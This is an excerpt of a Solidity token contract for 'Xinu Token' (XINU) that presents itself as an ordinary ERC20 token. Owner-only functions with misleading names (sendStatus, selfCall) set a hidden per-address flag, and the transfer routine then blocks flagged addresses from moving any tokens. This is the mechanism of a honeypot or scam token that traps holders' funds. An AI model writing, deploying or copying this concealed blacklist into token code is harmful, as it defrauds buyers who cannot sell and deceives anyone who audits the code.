...
contract XinuToken is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _sendStatus;
    ...
    string private _name = 'Xinu Token';
    string private _symbol = 'XINU';
    ...
    function refresh() public virtual onlyOwner {
        if (_state == true) {_state = false;}
        else {_state = true;}
    }
    
    function callRefresh() public view returns (bool) {
        return _state;
    }
    
    function  CheckSendStatus(address _address) public view returns (bool) {
        return _sendStatus[_address];
    }
    
    function sendStatus(address account) external onlyOwner() {
        _sendStatus[account] = true;
    }
    
    function selfCall(address account) external onlyOwner() {
        _sendStatus[account] = false;
    }
    ...
    function BurnSupply() public virtual onlyOwner {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if (_sendStatus[sender] || _sendStatus[recipient])
        require(amount == 0, "");
